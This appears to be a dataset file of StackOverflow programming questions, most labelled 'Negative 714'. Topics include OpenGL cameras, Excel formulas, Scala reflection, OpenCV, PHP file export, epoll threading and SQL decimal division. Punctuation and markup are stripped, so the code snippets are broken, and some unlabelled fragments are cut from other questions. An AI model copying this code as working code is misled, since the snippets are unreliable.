Negative 714 pSo Im trying to figure out how to mannually create a camera class that creates a local frame for camera transformations. Ive created a player object based on OpenGL SuperBibles GLFrame class. p  pI got keyboard keys mapped to the MoveUp, MoveRight and MoveForward functions and the horizontal and vertical mouse movements are mapped to the xRot variable and rotateLocalY function. This is done to create a FPS style camera.p  pThe problem however is in the RotateLocalY. Translation works fine and so does the vertical mouse movement but the horizontal movement scales all my objects down or up in a weird way. Besides the scaling, the rotation also seems to restrict itself to 180 degrees and rotates around the world origin 0.0 instead of my players local position.p  pI figured that the scaling had something to do with normalizing vectors but the GLframe class which I used for reference never normalized any vectors and that class works just fine. Normalizing most of my vectors only solved the scaling and all the other problems were still there so Im figuring one piece of code is causing all these problems p  pI cant seem to figure out where the problem lies, Ill post all the appropriate code here and a screenshot to show the scaling.p  pstrongPlayer objectstrongp  precodePlayerPlayer      location[0]  0.0f location[1]  0.0f location[2]  0.0f     up[0]  0.0f up[1]  1.0f up[2]  0.0f     forward[0]  0.0f forward[1]  0.0f forward[2]  1.0f    Does all the camera transformation.

Negative 714 pI have a table in Excel with column headings that correspond to part of a dynamic named range elsewhere in my workbook.  For example, I have these column headings 10, 20, etc., and these dynamic named ranges ExampleRange10, ExampleRange2, etc.  Id like to enter a VLookup formula that references ExampleRange10 by concatenating the string ExampleRange and the column heading 10.  This would allow me to simply extend the formula across all columns in the table, instead of manually typing ExampleRange10, ExampleRange20, etc. in each columns formula.  p  pIm aware of the INDIRECT function, and have used it successfully in the past with named ranges, but it doesnt seem to be working with the emdynamicem named range in this case.  Im guessing this is a nuance that has something to do with how dynamic named ranges are defined by Excel they dont show up in the named range dropdown to the left of the formula bar, and they have some interesting properties in VBA, for example.  Is there a way I can use the INDIRECT formula in conjunction with a dynamic named range, or is there another way that I can go about solving this problemp  pstrongEditstrong Here are the exact formulas used.br This is the main formula codeVLOOKUPB2,INDIRECTExampleRangeampC1,2,FALSEcode where C1 contains 10 and the formula for my dynamic named range called ExampleRange10 is codeOFFSETSheet1F2,0,0,COUNTASheet1F2F25,2code.  The main formula returns REF, but it works correctly when I remove the dynamic named range formula and simply define ExampleRange10 as a static range.p

Negative 714 pCan you create a Hub that you can send messages to clients from worker roles and web roles, or  have multiple different worker roles that can sent messages to clientsp  pOr is the recommend way to sent message to clients with SignalR to have a web role that handles all the messaging to the clients and you would use a queue to send messages from all the other roles to the clients. The other option that I see that I would have a hub for all each worker role and web role and you connect to a few different hubs this seems like a bad approach to me. p  pThe end goal for our hosted service is to have at least 2 web roles and 35 worker roles and the system is very event driven and would like to push messages to web clients when they happen, and not add another stage in the event pipeline for sending messages to connected clients.p

Or thats what Id like to do, anyway.p  pAnybody know how I should get codeXcode from codeTcode or codetypeOf[T]code or codetypeTag[T]code or any other conceivable codeTcodeadjacent conceptp  pHeres the code in 2.9.2p  precode  def getParser[T]implicit man Manifest[T] Parser[T]       if man ltlt manifest[Stream[]]        val itemType  man.typeArguments0       streamParseritemType.asInstanceOf[Parser[T]]      else        parsersman.asInstanceOf[Parser[T]]            def streamParser[T]implicit man Manifest[T] Parser[Stream[T]]       val itemParser  getParserman     openParser[ gt repsepitemParser, comma lt closeParser]  .toStream    codepre  pHeres what Im trying in 2.10.1, but not having much luck withp  precode  def getParser[T]implicit tag TypeTag[T] Parser[T]       if tag.tpe ltlt typeOf[Stream[]] tag.tpe match        case TypeRef, , ListitemType gt streamParseritemType.asInstanceOf[Parser[T]]      else        parserstag.asInstanceOf[Parser[T]]            def streamParser[T]implicit tag TypeTag[T] Parser[Stream[T]]       val itemParser  getParsertag     openParser[ gt repsepitemParser, comma lt closeParser]  .toStream    codepre  pThe problem is that it says codeitemTypecode is a codeTypecode from the reflection API, but I cant figure out how to turn that into a codeTypeTagcode suitable for sending to codestreamParsercode.p  pThat codeparserscode value is actually a map from codeTypeTagcodes to codeParsercodes, and it would probably be cleaner to just put everything into the codegetParsercode method and match on the type of the thing I want to parse, but my attempts at pattern matching on types havent seemed to work so far.p  pIm sure theres an easy way to do thisI think Im just caught between a new implementation and documentation that hasnt caught up to it.p

The trouble I have been having is thisp  pe.g I have two documents that are relatively the same and that have the same keywords to describe them.

Also, if I was to input parts engine or engine parts none of them will show. It seems to partake in only the first 2 or pairs of 2 keywords listed. The goal I would like to accomplish is to allow grouped keywords that the user inputs i.e. spare engine parts and allow it to still display all relative info that has any of the keywords listed and not have to worry about writing pairs or groups of keywords over and over.p  pI know there is a feature out there for full textsearch, but Ive researched that there have been instances of security breaches having that on, so I would like to avoid risking that.

Negative 714 pHi im currently writing a basic C application using the OpenCV library to segment the subject of the image from its background. The application reads in an image file and uses the watershed algorithm to generate a mask based on data it finds around the edges and data it finds in the centre of the image.p  pTo start I created an image object that has an overall value of 1. Then I created a border around an empty image which has a value of 1. Then I created a rectangle roughly in the centre of the image which has a value of 2. The border and the rectangle are not touching.p  pI attempt to remove data from the image using the generated mask using a bitwise AND between the original image and the autogenerated mask.p  pI have written this in C and would be very grateful if someone could take a quick look at my code. The only similar example I could find was using the native OpenCV bindings for Python.p  pSample Mask a hrefhttpi.imgur.coma0SUwy3.png relnofollowhttpi.imgur.coma0SUwy3.pngap  pSample Image a hrefhttpi.imgur.comFQywu6P.png relnofollowhttpi.imgur.comFQywu6P.pngap  precode Usage .app input.jpg include opencv2opencv.hpp include ltstringgt  using namespace cv using namespace std  class WatershedSegmenter private     cvMat markers public     void setMarkerscvMatamp markerImage              markerImage.convertTomarkers, CV32S           cvMat processcvMat ampimage              cvwatershedimage, markers         markers.convertTomarkers,CV8U         return markers         int mainint argc, char argv[]      cvMat image  cvimreadargv[1]     cvMat blankimage.size,CV8U,cvScalar0xFF     cvMat destimage.size,CV8U,cvScalar0xFF     imshoworiginalimage, image       Create markers image     cvMat markersimage.size,CV8U,cvScalar1     RecttopleftcornerX, topleftcornerY, width, height     top rectangle     markersRect0,0,image.cols, 5  Scalarall1     bottom rectangle     markersRect0,image.cols5,image.cols, 5  Scalarall1     left rectangle     markersRect0,0,5,image.rows  Scalarall1     right rectangle     markersRectimage.cols5,0,5,image.rows  Scalarall1     centre rectangle     markersRectimage.cols2,image.rows2,50, 50  Scalarall2       Create watershed segmentation object     WatershedSegmenter segmenter     segmenter.setMarkersmarkers     cvMat result  segmenter.processimage     result.convertToresult,CV8U      bitwiseandimage, blank, dest, result     imshowfinalresult, dest      cvwaitKey0      return 0  codepre

But Ill gladly explain how I get this error and will post the whole methodfunction code here.p  pThis code belongs, as you may have guessed from the window title, to a lane detection algorithm. We use Three.jswebgl to run some pre processing shaders on each frame of a video and then we analyze the resulting image. The methodfunction you see on the screenshot is a perpendicular line fitting algorithm and is part of the whole thing. I can see the algorithm running nicely because I have the lane being drawn on top of the video, and It is well placed. Until suddenly the lane turns into an horizontal bar. This unexpected behavior happens exactly because of the phenomenon I described here, since its from that moment that I start to see wrong math in the console.p  pAlso, because the video and algorithm run at slightly different fps everytime, the problem doesnt always happen in the same moment of the video, and sometimes It doesnt happen at all.p  pHere is the code it has some alterations because I was trying to isolate the issuep  precodethis.perpendicularLineFit  function points, slopeSign      var count  points.length     var sumX  0,         sumY  0     var sumX2  0,         sumY2  0,         sumXY  0     var meanX, meanY     var i, lowp  , highp       var B     var slope     var originY      for i  0 i lt count i          sumX  points[i].x         sumY  points[i].y         sumX2  points[i].x  points[i].x         sumY2  points[i].y  points[i].y         sumXY  points[i].y  points[i].x           meanX  sumX  count     meanY  sumY  count      If you uncoment this, problem reappears      var numeratorLeft  meanY  meanY     console.logmeanX,meanX     var meanX2  meanXmeanX     console.logmeanX2,meanX2      var numerator  sumY2  count  meanY  meanY  sumX2  count  meanX2     var denominator  count  meanX  meanY  sumXY       B  0.5  numerator  denominator       slope  B  slopeSign  Math.sqrtB  B  1     originY  meanY  slope  meanX      slope  isNaNslope  slopeSign  slope     originY  isNaNoriginY  originY  originY      lowp.y  this.lowY     lowp.x  this.lowY  originY  slope     highp.y  this.highY     highp.x  this.highY  originY  slope      return          low lowp,         high highp       codepre  pNow, I was trying to understand what was causing this, and the most bizarre thing is that it seams that when I place a statement of this formp  precodevar x  ... meanY  meanY ... codepre  pbefore the meanX2 attribution, the issue happens.

Negative 714 pI am using BFS to compute some paths in a graph and am computing the partial paths to each node. That is just an overview of the actual problem.p  pThe issue in question is, let us say that I have two nodes with a link in between them. All of them have three parameters, modeled as a list with three values only.p  pContents of path uptil node A is in listA, link parameters are stored in listC and the result of adding both of them go into a listB which is part of node B.p  pFor example, listA  [0,0,1] and listC  [1,1,1]. I am doing a pairwise addition on the lists, like p  precodelistB[0]  listA[0]  listC[0] listB[1]  listA[1]  listC[1] listB[2]  listA[2]  listC[2] codepre  pSo, at the end of the operation, I should have listB  [1,1,2]. As far as I am aware, listA should not be mutated in anyway. But when I perform this operation, listA and listB end up having the same values, even though listA is not on the LHS of any operation. Is there any Pythony concept that I am missing here I thought lists were immutable in their original form.p

Negative 714 pI have an online journaldiary site, where users save their diary entries to my DB via PHP and MYSQLi. p  pI want to add a feature where the user can save all their entries to a PDF file, with the click of a menu link.p  pWhat is the best way to do this I have looked into DOMPDF, and it seemed easy and promising, but getting it to work has taken up days and im ready to look at other solutions. p  pMaybe many solutions out there and I dont want to spend 3 days just to find out, it is not for me, so Im asking for those who have done something like this, what worked for you.p  pstrongUPDATEstrong I ws able to get dompdf working and it is fairly easy and works nice. The issue I encountered is that it crashes if it tries to render a large amount of HTML. Seems to be memory issues with codeGoogle consensus. For instance. my DB has 603 records, each record has about 2 paragraphs of text only. To me this is not something I would consider LARGE, from a MYSQL DB aspect. p  pI had to increase the maximum timeout settings to 320 seconds just so I could get it to read up to about 400 records without crashing Apache. I would add LIMIT 400 to my SQL statement and it would take about 300 seconds and display the PDF fileway too long to be reasonable. If I increased the LIMIT to say 450, it would crash apache. and Apacher error was something relating to bad memory overwrite etc.  So it works pretty good, for me, up until 400 records returned and during the render phase, it would be slow and crash at around 450 records. p  pthis seems to be the case as I googled and found many people with similar issues. It would seem that this would be something DOMPDF would know about and mention in their FAQ or fix, but they have not. So although I still would love a PDF option. I opted to simply allow the user to save data as a text file. this was very simple PHP coding 5 lines and saves my data as a file instantly. p  phere is the meat of the code that saves data to a text filep  precodemyFile  pdjentries.txt fo  fopenmyFile, w or diecant open file              data  ALL Your Entries from PersonalDreamJournal.comr    nrnrn             while row  Recordset1gtfetchassoc                                  data . datemdY, strtotimerow[date].          .row[flag]. rn                                         data . row[text]. r                   data .                   data  . rnrnrnrnrn                                 end while                     data .END OF ALL ENTRIES   headerContenttype applicationtxt headerContentDisposition attachment filenamepdjentries.txt echo data codepre

Negative 714 pIm kind of new to all of this and was hoping I could get some help. Some background that leads to my question is that I am building a small php interface that outputs a table. That table gets values from SQL Server. I have to display 4 tables. 34 table display successfully and dynamically where if the a column or row is added on the SQL server side it will update the php interface tables automatically. The 4th table is giving me an issue. Ive at least identified why it breaks the job the reason is because two columns in the table are datetime values in comparison to varchar or nvarchar values. p  pEssentially, the way i have it framed up in my head is to create an IF statement in my forloop that will read the data type of each column, and IF it is a datetime type it will put it in the correct PHP date format, and if not it will put it in the regular format. this maintains dynamics within the interface, ive done it all successfully, by hard coding the columns, but im trying to make my interface futureproofp  pthis is what i had in mind for an if statementp  plets say field is equivalent to the columns datavaluedatatype.

Negative 714 pSay you have two structures, codeGenericAcode and codeGenericBcode. codeGenericBcode is derived from codeGenericAcode.

Here is what I observed after posing the question here. The Table A and B the troublesome ones has this issue p  ul liWhen I ask repository service to return me an instance for a given ID for Table A and B, it returns them alright li liwhen a change is made to that instance using the setXXX, and updateEntity or saveEntity is called as shown using the demo entity code above, the saveupdate inserts a new entity in the table with exact attribute values as the old one, but with the new changes incorporated this was observed by removing the unique key constraint on the Table A and B. li liLater, when I query these newly created entities using their ID in the JPAJava code, and perform the exact same steps change some attribute and call saveupdate on the repository, these newly created entities rows in the db table get updated in exactly the manner expected. li liSo it seems that the original entity row is somehow locked and updates are prevented. Therefore, the JPA saveupdate calls simply tries to create a fresh one instead and since the fresh entity still has the same set of attribute values, any UNIQUE key constraint will start complaining of course li liI did some tests on the existing tables ETLd into the DB, and find this behavior consistent If the entity is NOT created by JPA, then JPA can read the data alright, but cannot update them if the entity IS created by JPA, then JPA can read AND update them alright.li ul  pNot sure how this happens though yet.

Negative 714 pprobably could be a rare petition, but here is the issue. p  pI am adapting an excel of a thirdparty to my organization. The excel is developed in english and the people of my organization just speaks spanish. I want to use exactly the same code that the original worksheet have, I prefer dont touch it althought I can do it, so I want to use a function that every time that a msgbox appears with the text in english, I translate the msgbox messages but without touching the original script. I am looking for a mask that could be called everytime that a msgbox is invoked in the original code. p  pI prefer dont touch the original code because the thirdparty developer could change it frequently, and it could be very annoying to change the code everytime that they do any little change. p  pIs that possible p

Negative 714 pI understand the whole principle and concept behind the SomeNoneOption and I can certainly appreciate its merits. My question is more of best practice. When does it become overkill and when does it make sense to use it religiously. I think and i could be wrong but it makes sense to use it as much as possible since its a safer way to pass around nothing as opposed to null. The thing I see myself doing a lot though is having some functions littered with map, getOrElse, get, match and even sometimes nesting them which tends to look ugly. Is there some concept Im missing or some best practice to do with a function that receives multiple Optional values. For examplep  precode  def updateJobsid Int  withAuth      request gt         User.userWithTokenrequest.headers.gettoken.get.map          user gt           Job.jobsAfterIdForForemanid.toString, user.id.toString match              case Somejson gt Okjson             case  gt NoContent                  .getOrElseBadRequest         codepre  por even worse for examplep  precode  def addPurchaseRequestjson JsValue       json  jobId.asOpt[Long].map        jobId gt JobDAO.jobWithIdjobId.map          job gt PurchaseRequestDAO.insertnew PurchaseRequestjson, job.map            model gt             val request  model.asInstanceOf[PurchaseRequest]             json  items.asOpt[List[JsObject]].map                list gt                  if PurchaseItemAssociationDAO.bulkInsertPurchaseItemAssociation.itemsFromJsonArraylist, request.id Optionrequest.addResponseJson else None                            .getOrElseNone         .getOrElseNone       .getOrElseNone     .getOrElseNone    codepre  pI managed to refactor some to not look so crazy, but is there a better way to refactor this so it doesnt look so crazy Am I missing something or do you get used to things just looking like this Seems like there should certainly be a cleaner practice.p

Negative 714 pIm creating a android AR app. p  pMy goal is to print on the device screen a element located using strongspherical coordinatestrong bearing, elevation, distance is not relevant in my case in the user coordinate system North, Down, East.  e.g.  North pole this 0, 0. 90, 10 would be at my East, 10 above the ground.p  pUsing with Android getRotationMatrix and co, I was able to print a element located using strongcartesian coordinatestrong x, y, z in the user coordinate system. This is roughly the strongmatrix productstrong of the element vector and the rotation matrix, rotating from user coord system to device coord system. p  pBut what about strongspherical coordinatestrong  Do I have to hand write this rotation matrix  I cannot find resources about spherical coordinate and rotation matrix... I must be missing something...p  pI thought about transforming spherical coordinate to cartesian, but it just seems like a workaround.p  pI dont use any extra framework but I can if needed.p

Negative 714 pI need to read large results of sql queries concurrently. I do not know the queries in advance or the result set size, but I expect it to be large up usually around 105 or 106 but some may get up toup to 108 maybe even 109 but. I do not really care how I actually go about querying the database so long as the combined result of the concurrent reading is logically equivalent to just executing the original query directly. I can transform the query into multiple queries if needed, provided I can do it in a generic way that is agnostic about the original query. What I really need to optimize is the total processing time. So sequentially iterating through a single result set in the master and just distributing the rows to the workers for is also option, but I would like to know how that compares to the alternatives.p

Negative 714 pTo find a synchronizing word I have always just used trial and error, which for small DFAs is fine but not so useful on larger DFAs. What I want to know, however, is if there exists an algorithm for determining a synchronizing word or if there is a way of being able to tell that one does not exist. Rather than just saying I cant find one, therefore one can not exist which is by no means a proof.p  pI have had a look around on google and so far just came across methods for determining what the upper and lower bounds for a length of a synchronizing word would be based on the number of states, however this is not helpful to me.p

Negative 714 pIm developing a WCF with two Classes as DataContracts.

Negative 714 pWhen a views template is refreshed due to changes of the model, the codedidInsertElementcode hook is not triggered as Ember tries to reuse views as much as possible. This causes some problems for me in that I need to select the first element of a list when the template is rerendered. This happens, for example, when new data is loaded from the server or the application transitions to a different route.p  pThe odd thing is that the views codeinitcode method does get called when the application transitions to a different route.

Negative 714 pI am using Visual Studio 2012. The projects in question are in VB.Net.p  pI have a Web Project MVC3 which references another project well call it the webLogic.dll its basically the go between from the web site to the database. The webLogic.dll has a reference to our dataStorage.dll this has the SQL and database connection details and such so the Web Project does not have a reference to the dataStorage.dll. The intent, not that it is completely relevant, was to set it up so the web site doesnt know or care how the data is stored.p  pHere is the issue, If I run a clean and then rebuild on the solution, the dataStorage.dll does not get copied to the Web Projects bin directory but the webLogic.dll does get copied. Obviously when debugging this fails miserably.p  pHowever, if I then run a rebuild on the solution without doing a clean first the dataStorage.dll does get copied to the Web Projects bin folder.p  pDoes anyone have any ideas as to why this happens or what I can do to make sure the dataStorage.dll is copied over without adding a reference to itp

I wanted to add basic authentication in which I verify the user credentials upon every request.

This unauthorized response comes before my authorization and I have proven that by removing my authorization code, which still results in the unauthorized response.

Its only when I add the credentials that I receive the unauthorized response.p  pTo summarize that a little...p  ul lilocalhost without credential headers worksli lilocalhost with credential headers worksli liGoDaddy without credential headers worksli liGoDaddy with credential headers unauthorizedli ul  pI have seen several posts outlining that forms authentication could be getting in the way and I need to enable anonymous authentication.

Negative 714 pIve been working for some time with SVN and Im now in the process of migrating to GIT, for rather obvious reasons. I can already create the git repository out of the svn one.p  pAs Im not very confident with GIT, before to effectively choose it as my versioning system, I want to keep the SVN repository synchronized with the GIT one, while working with GIT.p  pIm quite able to do this, through post push hooks, but I have the following issuesp  p1 The svn commit is done by the same user the one that controls the GIT repository from which the dcommits are performed.p  p2 In order for git svn to evaluate the new differences to commit on the SVN, it changes the GIT commit metadata by adding an ugly gitsvnid. This alters the commitsha and therefore requires an additional git pull which moreover creates a diamond in the repository tree.p  pIs there a way to avoid thisp  pNote that I could be satisfied by just ensuring a one side synchronization from GIT to SVN, whereas the opposite does not have to hold.p  pThanks in advance.p

Negative 714 pJust a simple question about command line stuff in C.p  pWhat does the below mean I get that a is an option for the execuble test. testa lt test.txtp  pBut what does lt test.txt meanp  pAlso if you guys could help me understand how a simple program would take in options like a, b, c as being three different options, that would be helpful. Off the top of my head it seems like the way to do this is just checking if that argument has 2 characters and it just is a  followed by a letter for a valid option, but is there any special way to do this Like is there something in C that automatically recognizes a  followed by a letter as something like an option p

The search is done on real time as I have a watch bind with the input model. p  pMy problem is that for whatever reason, the results will only appear when the full string is consistent with the result, not before. p  pFor example, if Im looking for strongFrank Sinatrastrong, some results will appear when strongFrankstrong is typed into the input, but once Im at strongFrank Sinstrong, completely unrelated results will appear or results consistent with strongSinstrong, but not with the whole string, and the desired result, will only appear once the whole string is entered.br What I understand, is that the input wont treat the entered text as a whole, but as a sum of the different words, which makes the query missbehave.p  pIm attaching my JS, maybe I did something wrongp  precodeangular.modulemyApp, [ngResource]  function Ctrlscope, http  var search  functionname    if name      http.gethttpapi.discogs.comdatabasesearchtypeartistampq name amppage1ampperpage5.       successfunctiondata3          scope.clicked  false         scope.results  data3.results             scope.reset  function       scope.sliding  false     scope.name  undefined     scope.watchname, search, true codepre

Negative 714 pSo, I havent done any programming in a few months because Im taking general prerequisite courses right now and I have a job, so now Im a little rusty and Id like to be up to par for when I take my next programming class in the Fall. Long story short, Im trying to get back on track, so Im making a silly practice program.p  pI made this program with all input and output done through the console using a Scanner, but then decided to go ahead and move over to JOptionPane as an interface. It was a pretty easy transition overall, but Im just having a problem with the output at the very end. Im trying to make all of the elements of an array into a nice, grammatically correct String for easy output in JOptionPane, but I cant really get my concatenation to work correctly. I realize that the output is not grammatically accurate when the amount of cats is one or two. Ill work on that after this, its an easy fix.p  pHere is the codep  precodeimport javax.swing.JOptionPane  public class JavaTestClass  public static void mainString[] args         Get number of cats     int numOfCats  Integer.parseIntJOptionPane.showInputDialogHow many cats do you have     JOptionPane.showMessageDialognull, Oh, so you have   numOfCats   cats.n, Confirmation, JOptionPane.INFORMATIONMESSAGE      Get cats names     String[] catNames  new String[numOfCats]      forint i0iltnumOfCatsi              catNames[i]  JOptionPane.showInputDialogEnter the name of cat   i1              Output cats names     String catNameList  null     forint i0iltnumOfCatsi              ifi1  numOfCats1                      catNameList.concatcatNames[i]  , and                   else if i1  numOfCats                      catNameList.concatcatNames[i]  .                  else                      catNameList.concatcatNames[i]  ,                    JOptionPane.showMessageDialognull, So your cats names are   catNameList, Names of cats, JOptionPane.INFORMATIONMESSAGE   codepre  pSorry about the spacing. It didnt really come out the way I wanted it to on here, but I dont have all day the indent all of the lines just for the sake of the post. Anyway, it should be relatively obvious, even without my long description above what Im trying to do. Any help would be much appreciated. Thanks in advance. p

I did not know how to partially sort the list of cities and append the member, Other, at the end. p

Negative 714 pWhere I work our main web application is served with nginxuwsgiDjango. A given production box has 80 uwsgi worker processes running on it. Our Django application makes moderately frequent requests to Amazon S3 but, if each of those 80 workers has to use its own HTTP connection for such requests, theyre not frequent enough to take advantage of the relatively short HTTP KeepAlive allowed for by Amazons servers. So, we frequently have to pay a reconnection penalty after the connection is dropped on Amazons side.p  pWhat I would like is if there were a proxy service running on the same box that could concentrate the S3 connections from those 80 processes down into a smaller pool of HTTP connections that would get enough use that they would be kept alive. The Django app would connect to the proxy, and the proxy would use its pool of keptalive connections to forward the requests to S3. I see that it is possible to use nginx itself as a forward proxy, but its not clear to me if or how this can take advantage of connection pooling the way I have in mind. An ideal solution would be good at autoscaling so that a uwsgi worker would never have to wait on the proxy itself for a connection, but would pare back connections as load drops so as to keep the connections as hot as possible perhaps keeping 1 or 2 spare to handle occasional upticks.p  pIve run across other forward proxies such as Squid but these products seem designed to fulfill the more traditional caching proxy role for use by e.g. ISPs that have many disparate remote clients.p  pDoes anyone know of an existing solution for this type of problem Many thanksp

Negative 714 pI know there are many questions about this, yet I still couldnt find the answer that helps me.p  pLets take a small tcp server with epoll and we want it to utilize as many cpu cores as possible. Ive thought about 2 ways it could be done, but none of them worked really well.p  p1  Each thread has its own epoll fd and in a while1 loop uses epollwait and processes the requests.p  p2  Only one epoll fd and creating a new thread for each request when processing it.p  pIn one single thread I could do around 25k reqs, so I was assuming the first method would help a lot, but in reality when I used 2 epoll fd the app could only process 10k reqs. Obviously I didnt even consider a 2nd method a real one, it was meant to fail, so yeah.p  pSo basically my question is how should I implement multithreading so it can emreallyem utilize more cpu coresp  pThe socket is nonblocking, TCPNODELAY, TCPFASTOPEN set, and Im using EPOLLET mode as well.p

Negative 714 pOk,p  pI am writing the ubiquitous crawler and have run into some problems. Not surprising being a total noob at Ruby.p  pI use Nokogiri to get the html of a page  find all the links in it that I am interested in and then download the files associated with those links. All is well so far.p  pHowever, I dont seem to be able to get the information I need from a single method.p  pIf I use codefile  openSrc.readcode then file contains the contents of the file  which is great for saving to a database, and for hashing purposes. But it doesnt give me easy access as far as I have found to attributes such as filename, size, file type etc.p  pTo get that information I am using Mechanize like thisp  precodeagent  Mechanize.new fop  agent.getSrc codepre  pUsing the head agent.head method I can get the contenttype, lastmodified date, and contentlength. codefop.filenamecode gives me the filename of course. Now using the codeagent.headSrc[contenttype]code method is, I think redownloading the information so for the contenttype, lastmodified and contentlength calls  it is downloading the head 3 times. A total waste I would say as file already contains the complete file and fop should provide me with all the other information I need without calling head.p  pSo is there a better way of doing this from the thumb nail downloaderp  precodethumbs.each do thumb   imgSrc  thumb.css.timg.first[src]   file  openimgSrc.read    agent  Mechanize.new   fop  agent.getimgSrc   p fop   puts 1 Driver         prowl.rb    puts 1 Source           pageURL   puts 1 Title            thumb.css.timg.first[alt]   puts 1 File Source      imgSrc   puts 1 File Type        agent.headimgSrc[contenttype].tos   puts 1 File Name        fop.filename   puts 1 Last Modified    agent.headimgSrc[lastmodified].tos   puts 1 Image Size       agent.headimgSrc[contentlength].tos   puts 1 MD5              GetMD5[file.tos]   puts 1 SHA256           GetSha256[file.tos] end  codepre  pSo the question isp  ol liHow can I optimise my crawler so that I can get all the information I want with the minimum number of requests and,li ol

Negative 714 pIm trying to make a simple square rotate slightly to the left when the user hovers over the element.  I am rotating the element about the Y axis.  When I hover over the element it looks like the left half of the element is correctly raising the hover. When you attempt to hover the right side is quirky.  I know its definitely related to something within my transform.  Hoping someone with more experience will be able to spot it.p  pstrongUpdatestrong I found a similar question here, but dont know what they mean in the answer. If I remove the heightwidth from the container element it works.

Negative 714 pI have been using sdbm to manage some keyvalue stores to help improve the application response time, and reduce pressure on the MySQL server. My code is a little bit clunky due to the nature of SDBM and the keyvalue stores SDBM creates are not inmemory data structures, but rather saved to the file system or at least this is my understanding of SDBM.p  pI realize that theres Memecached or Redis that can be used, but this is probably an overkill for my application. Are there any recommendations for something inbetweenp  pI realize that there is no code in my question, but I imagine that this is a coding prerequisite if you want an application that performs well and allows you to have a smaller footprint less memory and less expensive CPU, which is what programmers should seek.p

Negative 714 pI have a set of pairs. Each pair is represented as code[i,12]code.

Negative 714 pI was working on a bit of SQL for a project, and I noticed some seemingly strange behavior in SQL Server, with regard to what the answer looks like when dividing with decimals.p  pHere are some examples which illustrate the behavior Im seeingp  precodeDECLARE Ratio Decimal38,16 SET Ratio  CAST210 as Decimal38,16CAST222 as Decimal38,16  select Ratio  Results in 0.9459450000000000  DECLARE Ratio Decimal38,16 SET Ratio  CAST210 as DecimalCAST222 as Decimal  select Ratio  Results in 0.9459459459459459 codepre  pFor the code above, the answer for the query which is seemingly less precise gives a more precise value as the answer. When I cast both the dividend and the divisor as codeDecimal38,16code, I get a number with a scale of 6 casting it to a codeDecimal38,16code again results in the 0s padding the scale.p  pWhen I cast the dividend and divisor to just a default Decimal, with no precision or scale set manually, I get the full 16 digits in the scale of my result.p  pOut of curiosity, I began experimenting more with it, using these queriesp  precodeselect CAST210 as Decimal38,16CAST222 as Decimal38,16 0.945945 select CAST210 as Decimal28,16CAST222 as Decimal28,16 0.9459459459 select CAST210 as Decimal29,16CAST222 as Decimal29,16 0.945945945 codepre  pAs you can see, as I increase the precision, the scale of the answer appears to decrease. I cant see a correlation between the scale of the result vs the scale or precision of the dividend and divisor.p  pI found some other SO questions pointing to a place in the msdn documentation which states that the resulting precision and scale during an operation on a decimal is determined by performing a set of calculations on the precision and scale of the divisor and dividend, and thatp  blockquote   pThe result precision and scale have an absolute maximum of 38. When a result precision is greater than 38, the corresponding scale is reduced to prevent the integral part of a result from being truncated.p blockquote  pSo I tried running through those equations myself to determine what the output of dividing a codeDecimal38,16code into another codeDecimal38,16code would look like, and according to what I found, I still should have gotten back a more precise number than I did.p  pSo Im either doing the math wrong, or theres something else going on here that Im missing.  Id greatly appreciate any insight that any of you has to offer.p  pThanks in advance...p

Negative 714 pOk so I am working on my first responsive website that will be fluid and resize with the viewport. I have the page looking how I want it to for larger resolutions  a hrefhttpi28.photobucket.comalbumsc250WorldBalloonConventionwebScreenShot20140828at41624PMzps9c2e2e11.png relnofollowhttpi28.photobucket.comalbumsc250WorldBalloonConventionwebScreenShot20140828at41624PMzps9c2e2e11.pngap  pand it is essentially all inside of a div with the images aligned right and placed at different places through the text. I wanted to do it this way because creating two columns with div elements means that when I resize the page down to mobile size the pictures get tiny and stay in a column beside other text instead of just being forced below the text and keeping their size larger. The page looks good at mobile resolutions currently using this setup.p  pSo both of those look how I want, however my iPad breakpoint causes the images to bump into each other and the padding used to space them apart is forcing the center image to move left as it bumps into the top images padding as shown in this image a hrefhttpi28.photobucket.comalbumsc250WorldBalloonConventionwebScreenShot20140828at41656PMzps63322273.png relnofollowhttpi28.photobucket.comalbumsc250WorldBalloonConventionwebScreenShot20140828at41656PMzps63322273.pngap  pIs there a better way to space the images to look how I want but that wont cause them to bump into each other as the viewport is resized Currently this is the image paddingp  precode.padimg  paddingleft1 paddingtop4 paddingbottom1  codepre  pThanks for your time, I am used to just needing to create a good viewport for a desktop so I am having to relearn how to create for a responsive layout.p

Im also aware that unlike a compliant C11 compiler a hrefhttpstackoverflow.coma126476423422652Visual Studio does not create a moveconstructora for codeFoocode. But that should be OK, RVO is a C98 concept and works without movesemantics.p  pSo, the question is, is there a good reason why Visual Studio 2013 does not perform return value optimization in this casep  pI know of a few workarounds.

Profiler results show that Visual Studio 2013 still copies the vector if I just write codereturn vcode And even if it did work it would only be a workaround. Im not trying to actually fix this particular piece of code, Im trying to understand why RVO fails so I can predict when it might fail in the future. It is true that it is a more concise way of writing this particular example but there are plenty of cases where I couldnt just write codereturn vcode, for example if codeFoocode had additional constructor parameters.p

Negative 714 pWhat Im essentially trying to create is a website with multiple image galleries. There is a menu on the left that lets you select from the different galleries.

I achieve this through targets with a displayblock and displaynone in the css classes. p  pAs you can probably guess, because they are both hogging up that target, things arent working as intended.

Negative 714 pI am a newbie of using fancytree. I have created a demo to display data in a table within a webpage. Now I hope to collect the data back after users updated them.p  pI was using so called tree methods as mentioned in the tutorial. There is an example that has two lines belowp  precodevar tree  tree.fancytreegetTree  alertWe have   tree.count   nodes. codepre  pI thought I can use the fancytree instance, the variable tree in the above example, to access all nodes so that to collect the values they take. But when I put this twolines example into my codes, I got errors. p  pFor making it clear, I pasted the complete code below. Close to the end of the code, there are two comments marked by Place1 and Place2. When I put the twolines example in each of these two places, I got errors, which are Uncaught TypeError undefined is not a function, or Uncaught Error cannot call methods on fancytree prior to initialization attempted to call method getTree respectively.p  pI thought I must missed something. Any idea will be helpful.

Its possible MySQL dropped or rejected the connection the database was at 100 cpu load. p  pHowever, I have codemysql.connecttimeoutcode set to 60, so Id expect the connection to not last this long its been over 20 minutes. codedefaultsockettimeoutcode is also set to 300 seconds. p  pAnd Ill preempt any suggestions to upgrade to mysqli by saying that Ive tried that were using a DBAL, and had the same issue as mysqli uses the same connection functions under the hood.p  pI am running PHP 5.5.19 on Ubuntu, and using the mysqlnd driver.p  pAny idea what could cause PHP to not timeoutp
